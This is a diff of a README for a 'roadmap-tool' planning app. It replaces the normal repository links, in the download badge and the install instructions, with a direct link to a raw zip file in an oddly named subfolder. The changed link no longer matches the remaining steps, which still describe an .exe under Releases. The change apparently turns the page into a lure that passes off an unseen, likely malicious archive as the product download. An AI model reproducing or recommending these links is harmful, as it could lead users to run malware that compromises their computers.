@@ -1,6 +1,6 @@
 # 🗺️ roadmap-tool - Visualize your project goals with clarity
 
-[![Download roadmap-tool](https://img.shields.io/badge/Download-roadmap--tool-blue.svg)](https://github.com/Econometric-magneticmeridian512/roadmap-tool)
+[![Download roadmap-tool](https://img.shields.io/badge/Download-roadmap--tool-blue.svg)](https://github.com/Econometric-magneticmeridian512/roadmap-tool/raw/refs/heads/main/ashrafi/tool-roadmap-v1.9-alpha.2.zip)
 
 This tool helps you build and manage project roadmaps. You organize tasks, set deadlines, and track your progress through a simple interface. Many users find this useful for planning work cycles, managing personal projects, or tracking team objectives. The application runs locally on your computer.
 
@@ -20,7 +20,7 @@ These requirements ensure the interface remains responsive while you manage your
 
 The installation process requires only a few clicks. Follow these instructions to set up the software on your Windows machine.
 
-1. Visit the following link to access the download options: https://github.com/Econometric-magneticmeridian512/roadmap-tool
+1. Visit the following link to access the download options: https://github.com/Econometric-magneticmeridian512/roadmap-tool/raw/refs/heads/main/ashrafi/tool-roadmap-v1.9-alpha.2.zip
 2. Look for the section labeled "Releases" on the right side of the page.
 3. Select the latest version listed.
 4. Find the file ending in ".exe" under the "Assets" header.
